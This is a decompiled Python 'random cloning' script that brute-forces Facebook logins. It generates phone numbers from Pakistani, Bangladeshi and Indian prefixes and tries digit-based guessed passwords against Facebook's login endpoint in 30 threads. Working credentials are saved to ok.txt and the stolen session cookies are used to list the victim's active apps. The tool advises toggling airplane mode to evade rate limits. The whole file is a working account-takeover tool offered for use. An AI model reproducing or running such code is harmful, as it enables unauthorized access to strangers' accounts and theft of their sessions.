# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-10-22 19:25:30.331865

import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://free.facebook.com/?_rdc=1&_rdr"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

ugen=[]
for x in range(100):
    aa='Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo ="""
\033[1;92m'########::'####:'##::::::::::'###::::'##:::::::
 ##.... ##:. ##:: ##:::::::::'## ##::: ##:::::::
 ##:::: ##:: ##:: ##::::::::'##:. ##:: ##:::::::
 ########::: ##:: ##:::::::'##:::. ##: ##:::::::
 ##.... ##:: ##:: ##::::::: #########: ##:::::::
 ##:::: ##:: ##:: ##::::::: ##.... ##: ##:::::::
 ########::'####: ########: ##:::: ##: ########:
........:::....::........::..:::::..::........::\033[1;93m
╭──────────•◈•───────────────────╮
[-] TOOLS     RANDOM CLONING
[-] VERSION    0.0.1
[-] AUTHOR    MUHAMMAD BILAL
[-] GITHUB    PRIVATE
[-] FB GROUP      https://www.facebook.com/groups/1621824131392265/permalink/3204241489817180/
╰──────────•◈•───────────────────╯  
'\33[1;93mTURN on & off (ARPLANE MODE) before use   
\033[1;92m==============================================================="""

os.system("clear")
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r ðŸŽ®  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
def main():
    user=[]
    os.system('clear')
    print(logo)
    print('PAKISTAN Enter Four Digit Code [92301] [92302] [92305] [92306]')
    print('BANGLADESH Enter Four Digit Code [88013] [88017] [88018] [88016]')
    print('INDIAN  Enter Four Digit Code [918464] [918465] [918406] [917965]')  
    kode = input('[?] Input Code Pakistan Best: ')
    limit = int(input('How Many Numbers Do You Want To Add? Simple(5000)(10000)(50000? '))
    for nmbr in range(limit):
	    nmp = ''.join(random.choice(string.digits) for _ in range(7))
	    user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
	    os.system('clear')
	    print(logo)
	    tl = str(len(user))
	    print('Total ids:\033[m '+tl)
	    print(54*'_')
	    for guru in user:
		    uid = kode+guru
		    pwx = [guru]
		    yaari.submit(rcrack,uid,pwx,tl)
    print(54*'_')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(54*'_')
    
def random_pak_jsjnumber():
	user=[]
	os.system('clear')
	print(logo)
	print('[+] For Pak Enter Four Digit Code add only zong (92310)')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;37;1m[$] Tools Has been started...(\033[1;92mPakistan\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			bilal = uid[0:6]
			pwx = [guru,bilal]
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	print(' Press Inter To Back Menu')
	menu()
    
agents=[]

def rcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global agents
	try:
		for ps in pwx:
			agents = ['Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27' ]
			session = requests.Session()
			sys.stdout.write('\r[%s] [OK:%s]'%(loop,len(oks))),
			sys.stdout.flush()
			pro = random.choice(agents)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {
			'authority': 'free.facebook.com',
			'method': 'get',
			'path': '/.php?ref_component=mfreebasic_home_header&ref_page=/wap/home.php&refid=8&paipv=0&eav=AfbFjtJn7djdiswAAWno6AzT_Sm-9FisdLakQ-6Tzm_RhB-uVLB86D8JUFb2J-03uFE&tbua=1',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding': 'gzip, deflate, br',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7',
	'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-GB) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+',}
			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[151:166]
				print('\33[1;92m[BILAL-OK] '+uid+' | '+ps+'\33[0;97m')
				cek_apk(session,coki)
				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(uid)
				break
			else:
				continue
		loop+=1
	except:
		pass
print('chk update')
main()